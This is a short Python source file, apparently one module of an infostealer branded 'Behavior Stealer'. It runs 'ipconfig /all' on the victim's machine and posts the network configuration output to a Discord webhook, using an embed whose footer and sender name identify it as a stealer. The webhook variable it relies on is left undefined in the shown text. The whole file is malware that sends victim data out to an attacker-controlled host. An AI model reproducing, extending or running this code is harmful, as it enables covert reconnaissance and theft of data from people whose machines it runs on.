import subprocess
import requests


AVATAR_URL = "https://cdn.discordapp.com/attachments/1375534863049822279/1383070822603817100/logo.png"

def get_ipconfig():
    try:
        output = subprocess.check_output("ipconfig /all", shell=True, text=True)
        return output.strip()
    except Exception as e:
        return f"Error: {e}"

def send_embed(content: str):
    if not Behavior:
        print("Webhook URL not set")
        return

    if len(content) > 1000:
        content = content[:1000] + "..."

    embed = {
        "title": "\U0001F4E1 IPConfig /all",
        "color": 0x00FFFF,
        "fields": [{"name": "Output", "value": f"```{content}```", "inline": False}],
        "footer": {"text": "Behavior Stealer \U0001F47E"}
    }

    payload = {
        "username": "Behavior Stealer",
        "avatar_url": AVATAR_URL,
        "embeds": [embed]
    }

    try:
        requests.post(Behavior, json=payload)
    except Exception as e:
        print(f"Erreur envoi webhook : {e}")

def run():
    config = get_ipconfig()
    send_embed(config)

if __name__ == "__main__":
    run()
